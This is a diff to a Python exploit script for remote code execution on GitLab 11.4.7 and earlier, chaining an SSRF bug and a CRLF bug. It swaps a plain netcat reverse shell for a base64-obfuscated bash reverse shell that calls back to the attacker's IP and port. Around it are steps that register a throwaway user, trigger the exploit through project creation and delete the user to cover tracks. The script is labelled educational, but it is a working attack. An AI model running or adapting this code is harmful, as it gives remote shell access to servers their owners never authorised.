@@ -3,6 +3,7 @@ Gitlab RCE version <= 11.4.7 - EDUCATIONAL USE ONLY
 CVEs: CVE-2018-19571 (SSRF) + CVE-2018-19585 (CRLF)
 """
 
+import base64
 from html.parser import HTMLParser
 import random
 import string
@@ -76,9 +77,16 @@ class GitlabRCE:
         result = self.session.post(self.url + "/projects", data=data, verify=False)
         print("hacking in progress - {}".format(result.status_code))
 
+    def prepare_payload(self):
+        payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.local_ip, self.port)
+        wrapper = "echo {base64_payload} | base64 -d | /bin/bash"
+        base64_payload = base64.b64encode(payload.encode()).decode("utf-8")
+        payload = wrapper.format(base64_payload=base64_payload)
+        return payload
+
     def main(self):
         self.register_user()
-        self.exploit_project_creation("nc {} {} -e /bin/bash".format(self.local_ip, self.port))
+        self.exploit_project_creation(self.prepare_payload())
         time.sleep(10)
         self.delete_user()
 
